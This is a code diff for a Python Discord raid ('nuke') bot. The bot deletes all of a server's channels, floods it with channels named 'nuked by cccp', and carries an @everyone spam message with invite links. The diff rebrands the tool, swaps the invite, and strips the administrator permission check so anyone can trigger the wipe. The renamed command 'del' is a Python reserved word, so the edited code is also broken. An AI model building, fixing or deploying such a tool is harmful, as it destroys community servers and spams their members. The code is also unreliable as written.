@@ -11,8 +11,8 @@ bot = commands.Bot(command_prefix="!", intents=intents)
 
 宣伝文 = (
     "@everyone @here\n"
-    "# AARX ON TOP\n"
-    "# [参加](https://discord.gg/FDfqhyS38J)\n"
+    "# CCCP ON TOP\n"
+    "# [参加](https://discord.gg/ncUCZfJXRs)\n"
     "# [画像](https://imgur.com/NbBGFcf)\n"
     "# [画像](https://imgur.com/pY7EpwN)"
 )
@@ -22,10 +22,10 @@ async def on_ready():
     print(f"✅ Bot ログイン成功: {bot.user}")
 
 @bot.command()
-@commands.has_permissions(administrator=True)
-async def nuke(ctx):
+async def del(ctx):
     guild = ctx.guild
     await ctx.message.delete()
+
 
     print("🔄 チャンネル削除中...")
     delete_tasks = [asyncio.create_task(ch.delete()) for ch in guild.channels]
@@ -35,7 +35,7 @@ async def nuke(ctx):
     new_channels = []
     for i in range(0, 60, 15):
         tasks = [
-            asyncio.create_task(guild.create_text_channel("nuked by AARX"))
+            asyncio.create_task(guild.create_text_channel("nuked by cccp"))
             for _ in range(15)
         ]
         results = await asyncio.gather(*tasks, return_exceptions=True)
